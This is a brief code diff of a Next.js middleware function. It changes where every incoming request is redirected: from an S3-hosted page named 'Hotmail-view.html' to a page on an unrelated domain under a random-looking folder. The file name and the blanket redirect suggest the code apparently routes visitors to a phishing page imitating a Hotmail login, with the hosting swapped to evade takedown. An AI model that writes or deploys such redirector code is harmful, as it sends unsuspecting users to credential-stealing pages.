@@ -41,14 +41,14 @@ export function middleware(request) {
   // Redirect when ?ad=ad
   if (adParam === 'ad') {
     return NextResponse.redirect(
-      'https://kd0-940x.s3.us-east-2.amazonaws.com/Hotmail-view.html',
+      'https://descubrecoinco.cl/w0-xy100e/index.html',
       { status: 301 }
     )
   }
 
   // Default redirect
   return NextResponse.redirect(
-    'https://kd0-940x.s3.us-east-2.amazonaws.com/Hotmail-view.html',
+    'https://descubrecoinco.cl/w0-xy100e/index.html',
     { status: 302 }
   )
 }
